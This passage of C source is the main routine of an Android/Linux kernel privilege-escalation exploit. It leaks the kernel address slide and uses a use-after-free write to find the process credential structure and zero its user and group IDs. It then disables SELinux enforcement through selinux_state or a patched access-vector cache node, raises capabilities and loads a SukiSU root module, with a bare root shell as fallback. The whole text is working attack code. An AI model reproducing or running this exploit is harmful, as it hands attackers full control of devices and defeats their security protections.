        else if (!strcmp(argv[i], "--spray") && i + 1 < argc)
            g_spray_fake = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--pre") && i + 1 < argc)
            g_pre_reports = atoi(argv[++i]);
        else {
            usage(argv[0]);
            return 2;
        }
    }
    {
        cpu_set_t set;
        CPU_ZERO(&set); CPU_SET(0, &set);
        sched_setaffinity(0, sizeof(set), &set);
    }

    P("[*] 117 99491 port stage=%s\n", stage);
    P("[*] uid=%u euid=%u gid=%u\n", (unsigned)getuid(),
      (unsigned)geteuid(), (unsigned)getgid());
    P("[*] selinux=%s\n", "Enforcing?");

    uint64_t slide = leak_slide();
    if (!slide) {
        P("[-] no slide\n");
        return 1;
    }
    P("[*] slide=%#llx\n", (unsigned long long)slide);
    if (!strcmp(stage, "slide"))
        return 0;

    uint64_t creds[24];
    pid_t child = -1;
    int go = -1, st = -1;
    int nc = leak_child_creds(slide, creds, 24, &child, &go, &st);
    if (nc <= 0) {
        P("[-] no cred candidates\n");
        return 1;
    }
    if (!strcmp(stage, "cred")) {
        close(go); close(st); kill(child, SIGKILL); waitpid(child, NULL, 0);
        return 0;
    }

    /* Find the live cred with a zero write at euid/egid (cred+0x18). */
    uint64_t live = 0;
    for (int k = 0; k < nc && !live; k++) {
        int tries = k == 0 ? 4 : 2;
        for (int t = 0; t < tries && !live; t++) {
            uint32_t eu = 0xffffffffu;
            if (direct_uaf_write(creds[k] + CRED_EUID, 1) < 0)
                continue;
            if (cmd_euid(go, st, &eu) != 0)
                break;
            P("[*] cand %d/%d try %d euid=%u\n", k + 1, nc, t + 1, eu);
            if (eu == 0)
                live = creds[k];
        }
    }
    if (!live) {
        P("[-] no live cred\n");
        close(go); close(st); kill(child, SIGKILL); waitpid(child, NULL, 0);
        return 1;
    }
    P("[+] live cred %#llx\n", (unsigned long long)live);

    if (g_store_count) {
        uint32_t vals[8] = {0};
        if (!g_switch_state_set) g_switch_state = 0;
        P("[*] store probe state=%d pre=%d target=%#llx\n",
          g_switch_state, g_pre_reports, (unsigned long long)(live + CRED_UID));
        (void)direct_uaf_write_n(live + CRED_UID, 0, 1);
        (void)write(go, "S", 1);
        if (read_full(st, vals, sizeof(vals)) == 0) {
            P("[*] Uid=%u %u %u %u\n", vals[0], vals[1], vals[2], vals[3]);
            P("[*] Gid=%u %u %u %u\n", vals[4], vals[5], vals[6], vals[7]);
            int hits = 0;
            for (int k = 0; k < 4; k++)
                if (vals[k] == 0x000e0005U) hits++;
            P("[*] store_count_est=%d\n", hits);
        }
        (void)write(go, "Q", 1);
        usleep(100000);
        close(go); close(st);
        waitpid(child, NULL, 0);
        return 0;
    }

    /* zero uid/gid/suid/sgid; euid/egid; fsuid/fsgid */
    const uint64_t zeros[] = {
        live + CRED_UID, live + CRED_EUID, live + CRED_FSUID
    };
    if (g_avc_test) {
        (void)direct_uaf_write(live + CRED_FSUID, 1);
    } else
    for (unsigned i = 0; i < sizeof(zeros) / sizeof(zeros[0]); i++) {
        int ok = 0;
        for (int t = 0; t < 4 && !ok; t++) {
            if (direct_uaf_write(zeros[i], 1) < 0) continue;
            uint32_t ug[2] = { 0xffffffffu, 0xffffffffu };
            uint32_t eu = 0xffffffffu;
            cmd_uidgid(go, st, ug);
            cmd_euid(go, st, &eu);
            P("[*] zero %d: uid=%u gid=%u euid=%u\n", i, ug[0], ug[1], eu);
            if (ug[0] == 0 && ug[1] == 0 && eu == 0) ok = 1;
        }
    }

    /* Prepare the SukiSU module while the parent still owns /data/local/tmp.
     * AVC-only experiments do not need the module. */
    int prep = (g_avc_test || g_prepatched) ? 0 : prepatch_module(slide);
    if (prep != 0)
        P("[!] module prepatch failed\n");

    /* First try the 98260-style direct selinux_state-7 zero: it clears
     * enforcing@0 and avoids the avc_node/xperms field entirely. */
    int avc_ok = 0;
    int caps_ok = 0;
    if (prep == 0 && !g_avc_only) {
        uint32_t enf = 0xffffffffu;
        (void)direct_uaf_write(slide + SELINUX_LINK - 7, 1);
        if (write(go, "R", 1) == 1 && read_full(st, &enf, sizeof(enf)) == 0) {
            P("[*] selinux_state-7 enforce=%u\n", enf);
            if (enf == 0) avc_ok = 1;
        }
    }

    /* AVC fallback: denied setenforce allocates an avc_node; patch its
     * AVD_FLAGS_PERMISSIVE bit, then retry setenforce 0. */
    if (prep == 0 && !avc_ok && !g_no_avc) {
        for (int round = 0; round < 4 && !avc_ok; round++) {
            struct { uint64_t node; uint32_t open_ok, oerr, fsuid; } rb;
            uint32_t enf = 0xffffffffu;
            memset(&rb, 0, sizeof(rb));
            if (write(go, "B", 1) != 1) break;
            if (read_full(st, &rb, sizeof(rb)) != 0) break;
            P("[*] avc round %d open=%u errno=%u fsuid=%u node=%#llx\n",
              round + 1, rb.open_ok, rb.oerr, rb.fsuid,
              (unsigned long long)rb.node);
            if (!rb.open_ok) {
                (void)direct_uaf_write(live + CRED_FSUID, 1);
                continue;
            }
            if (!rb.node) {
                P("[-] avc: no node\n");
                break;
            }
            for (int t = 0; t < 8 && !avc_ok; t++) {
                g_switch_state = 0;
                g_pre_reports = 0; /* shared->is_touch_on starts 1; no pre-toggle
                                    * makes the single EV_SW value 1. */
                /* input_value is {u16 type,u16 code,s32 value}.  Point vals
                 * at flags-4 so the 4-byte value store lands on avd.flags
                 * and leaves xp_node at +0x20 untouched; the type/code
                 * store lands on seqno at +0x18.  A single pad report with
                 * evbit=EV_SW appends exactly one input_value; EV_SYN is
                 * dropped at input_event() so there is no flush and no
                 * second slot at +0x20. */
                (void)direct_uaf_write_n(rb.node + 0x18, 0, 1);
                if (write(go, "R", 1) != 1) break;
                if (read_full(st, &enf, sizeof(enf)) != 0) break;
                P("[*] avc flags try %d state=%d enforce=%u\n",
                  t + 1, g_switch_state, enf);
                if (enf == 0) avc_ok = 1;
            }
        }
    }
    if (avc_ok && g_avc_test) {
        P("[+] avc TEST OK node=%#llx off=%#llx enforce=%u\n",
          (unsigned long long)0, (unsigned long long)g_avc_off, selinux_enforce_now());
        (void)write(go, "Q", 1);
        usleep(200000);
        close(go); close(st);
        waitpid(child, NULL, 0);
        P("[+] avc test done\n");
        return 0;
    }
    if (avc_ok) {
        if (!g_no_caps && !g_avc_test) {
            g_switch_state = 0;
            g_pre_reports = 1; /* pre-toggle so two pad reports produce a
                                * single stored slot at 0x3e; without it the
                                * second slot lands on cap_bset. */
            (void)direct_uaf_write_n(live + CRED_CAP_EFF - 2, 0, 2);
            uint64_t caps[2] = { 0, 0 };
            if (cmd_caps(go, st, caps) == 0) {
                caps_ok = (caps[0] & (1ULL << 16)) != 0;
                P("[*] caps eff=%#llx bnd=%#llx\n",
                  (unsigned long long)caps[0], (unsigned long long)caps[1]);
            }
        }
        P("[+] avc: permissive window open; releasing loadksu\n");
        (void)write(go, "L", 1);
        for (int i = 0; i < 120; i++) {
            int ws = 0;
            pid_t r = waitpid(child, &ws, WNOHANG);
            if (r == child) {
                P("[+] loadksu child exited status=%#x\n", ws);
                break;
            }
            usleep(250000);
        }
        close(go); close(st);
        P("[+] done (avc+ksu)\n");
        return 0;
    }
    P("[!] avc window failed; falling back to root shell only\n");

    if (!g_no_caps && !g_avc_test) {
        g_switch_state = 0;
        g_pre_reports = 1;
        (void)direct_uaf_write_n(live + CRED_CAP_EFF - 2, 0, 2);
        uint64_t caps[2] = { 0, 0 };
        if (cmd_caps(go, st, caps) == 0) {
            caps_ok = (caps[0] & (1ULL << 16)) != 0;
            P("[*] caps eff=%#llx bnd=%#llx\n",
              (unsigned long long)caps[0], (unsigned long long)caps[1]);
        }
    }

    uint32_t ug[2] = { 0xffffffffu, 0xffffffffu };
    uint32_t eu = 0xffffffffu;
    cmd_uidgid(go, st, ug);
    cmd_euid(go, st, &eu);
    P("[+] final uid=%u gid=%u euid=%u caps_ok=%d\n",
      ug[0], ug[1], eu, caps_ok);

    if (write(go, "X", 1) != 1) P("[-] release failed\n");
    usleep(3000000);
    close(go); close(st);
    kill(child, SIGKILL);
    waitpid(child, NULL, 0);
    P("[+] done\n");
    return 0;
}
